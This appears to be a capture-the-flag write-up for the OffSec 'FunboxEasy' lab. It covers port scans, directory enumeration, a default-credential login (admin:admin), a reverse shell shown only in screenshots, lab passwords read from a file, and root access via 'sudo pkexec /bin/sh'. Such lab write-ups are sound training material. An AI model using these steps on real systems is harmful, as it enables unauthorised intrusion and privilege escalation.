![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/d26d600d-52d9-43a7-8326-0eb484876420)# FunboxEasy

```shell
> rustscan -b 1000 -u 5000 -r 0-65535 -a 192.168.196.111 -- -Pn
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.196.111:22
Open 192.168.196.111:80
Open 192.168.196.111:33060
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 06:43 EDT
Initiating Parallel DNS resolution of 1 host. at 06:43
Completed Parallel DNS resolution of 1 host. at 06:43, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 06:43
Scanning 192.168.196.111 [3 ports]
Discovered open port 80/tcp on 192.168.196.111
Discovered open port 33060/tcp on 192.168.196.111
Discovered open port 22/tcp on 192.168.196.111
Completed Connect Scan at 06:43, 1.94s elapsed (3 total ports)
Nmap scan report for 192.168.196.111
Host is up, received user-set (0.16s latency).
Scanned at 2023-10-11 06:43:13 EDT for 2s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
33060/tcp open  mysqlx  syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.00 seconds
```

```shell
> rustscan -u 5000 -p 22,80,33060 -a 192.168.196.111 -- -Pn -sCV
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.196.111:33060
Open 192.168.196.111:80
Open 192.168.196.111:22
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 06:48 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:48
Completed NSE at 06:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:48
Completed NSE at 06:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:48
Completed NSE at 06:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:48
Completed Parallel DNS resolution of 1 host. at 06:48, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 06:48
Scanning 192.168.196.111 [3 ports]
Discovered open port 80/tcp on 192.168.196.111
Discovered open port 22/tcp on 192.168.196.111
Discovered open port 33060/tcp on 192.168.196.111
Completed Connect Scan at 06:48, 0.16s elapsed (3 total ports)
Initiating Service scan at 06:48
Scanning 3 services on 192.168.196.111
Completed Service scan at 06:49, 72.91s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.196.111.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:49
Completed NSE at 06:49, 17.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:49
Completed NSE at 06:49, 1.44s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:49
Completed NSE at 06:49, 0.00s elapsed
Nmap scan report for 192.168.196.111
Host is up, received user-set (0.16s latency).
Scanned at 2023-10-11 06:48:08 EDT for 91s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBFf9aHhJU3GLUWqDvIV38olRMjbK+4e5i8pnIvPF9Qwn+ENXGyYDnDkzX0ZtH4B47hLgn9YNyI42G93vImly3EkYAfcOqoVLod8LkoofwfE++CXozZqV/itluReYeTJUqdS3kVartO4BP0E95qkTcX9DgdSxA8FsYlZqo7Y9sBW/ZuM6sQKwjQj24UvoCTa6XypoGb7CYm0+cmcUb0Z8sD934oLyhfBJUrTZW9/pJ/Cv7+l4BVBASwNHgdJd36aa7ktGRh6eq4cxgVU4lWNAONKzzSyusK1R4xZYDzACCMBM8RRLbTB9Q2lz/LzZOrMi/sFFvUrDVMIblUUZyoCr6eSPhq1spSrSEkG6im2yPRMT/VyNgnslr99m3peVLPG6hQxqaKfuImfNTF8OE8iPB7kbGnGxfX6eH39Jyhy0+bTqa4vMuhwvFZXiXRIeHVdtfmNK3tQ+Rl7V+3NELpVw0AJ3ZTSuqN8N1FagoEHrLmtScwHsrjGjv1gNoOr5VNMU=
|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBj3AVqceVrNYPKcj93yFU/eGll7QOs4iCDa6gan7lG6NzelFXpcJU7yWo4Jw/CGTKWryHjUnt//0/uu7c3Qs8g=
|   256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICvJsP8vRVvuxGvwmEbZzieFB8s+azVy6fwOOQToDJ8I
80/tcp    open  http    syn-ack Apache httpd 2.4.41
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
33060/tcp open  mysqlx? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94%I=7%D=10/11%Time=65267D6E%P=x86_64-pc-linux-gnu%r(
SF:NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSP
SF:Request,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\
SF:0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
SF:")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessio
SF:nReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1
SF:a\x0fInvalid\x20message\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearch
SF:Req,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a
SF:\x0fInvalid\x20message\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-R
SF:C,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInva
SF:lid\x20message\"\x05HY000");
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:49
Completed NSE at 06:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:49
Completed NSE at 06:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:49
Completed NSE at 06:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.76 seconds
```

TCP 80 - HTTP
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/56b386c2-5a59-4626-ab8e-3c16af480094)

```shell
> dirsearch -u http://192.168.196.111
```
```shell
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11715

Output: /home/superuser/reports/http_192.168.196.111/_23-10-11_07-09-55.txt

Target: http://192.168.196.111/

[07:09:55] Starting: 
[07:10:25] 403 -  280B  - /.ht_wsr.txt                                      
[07:10:25] 403 -  280B  - /.htaccess.orig                                   
[07:10:25] 403 -  280B  - /.htaccess_sc                                     
[07:10:25] 403 -  280B  - /.htaccessBAK
[07:10:25] 403 -  280B  - /.htaccessOLD2
[07:10:25] 403 -  280B  - /.htaccess.bak1                                   
[07:10:25] 403 -  280B  - /.htaccess.sample                                 
[07:10:25] 403 -  280B  - /.htpasswds
[07:10:25] 403 -  280B  - /.htaccess_orig
[07:10:25] 403 -  280B  - /.htaccessOLD
[07:10:25] 403 -  280B  - /.htaccess_extra
[07:10:25] 403 -  280B  - /.httr-oauth                                      
[07:10:25] 403 -  280B  - /.html                                            
[07:10:26] 403 -  280B  - /.htm                                             
[07:10:26] 403 -  280B  - /.htaccess.save                                   
[07:10:26] 403 -  280B  - /.htpasswd_test                                   
[07:10:33] 403 -  280B  - /.php                                             
[07:11:05] 301 -  318B  - /admin  ->  http://192.168.196.111/admin/         
[07:11:11] 200 -    3KB - /admin/index.php                                  
[07:11:11] 200 -    3KB - /admin/                                           
[07:11:16] 302 -   24KB - /admin/home.php  ->  http://192.168.196.111/admin/index.php
[07:12:00] 200 -    0B  - /checklogin.php                                   
[07:12:15] 302 -   10KB - /dashboard.php  ->  http://192.168.196.111/index.php
[07:12:44] 200 -    2KB - /header.php                                       
[07:12:52] 200 -    3KB - /index.php                                        
[07:12:52] 200 -    3KB - /index.php/login/                                 
[07:13:08] 200 -   75B  - /logout.php                                       
[07:13:51] 302 -    7KB - /profile.php  ->  http://192.168.196.111/index.php
[07:13:58] 200 -   14B  - /robots.txt                                       
[07:14:02] 301 -  319B  - /secret  ->  http://192.168.196.111/secret/       
[07:14:03] 403 -  280B  - /server-status                                    
[07:14:03] 403 -  280B  - /server-status/
[07:14:03] 200 -  108B  - /secret/                                          
[07:14:16] 301 -  318B  - /store  ->  http://192.168.196.111/store/         
                                                                             
Task Completed 
```

```http
http://192.168.196.111/admin/index.php
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/2fa613d8-641a-4f09-b1f5-81fd5d688eaf)

```http
http://192.168.196.111/secret/
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/7f90b641-1844-4fd9-a61d-89af3949b8bf)

```http
http://192.168.196.111/store
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/11a7095c-481a-485a-b66c-f0be8d52639c)
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/a8f6e1b8-8b86-4e75-8d33-5e0ffeddfe8e)

Default Credentials: `admin:admin`

```http
http://192.168.196.111/store/admin.php -> http://192.168.196.111/store/admin_book.php
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/8140e8d0-fc79-4064-9d15-d4ccca3f8030)

```http
http://192.168.196.111/store/admin_add.php
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/627f8f5b-0d03-4ce8-b081-2afdf89b3a66)
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/54144cc0-ff01-40e2-8ef3-df8538ee37f0)

Reverse Shell
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/853a6076-2f60-4ad7-813b-d20ab52ce523)
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/8be84fce-6047-47b6-bfc8-ff56a54093dc)

Creds:
```css
$ cat password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

Shell as Tony
```shell
ssh@tony
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/7aa2da34-6954-41a5-b542-b414ac0724c3)

Privilege Escalation
```shell
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/5d6a1dc2-eaae-4bba-8b96-ce360621fc62)

Privilege Escation via `pkexec`
Source: [GTFO Bins](https://gtfobins.github.io/gtfobins/pkexec/)
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/172d37ba-5ae5-49a2-a453-db25cf88242a)
```shell
tony@funbox3:~$ sudo /usr/bin/pkexec /bin/sh
```
![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/9f39e391-815b-4447-99b0-cc2c5fa2794e)

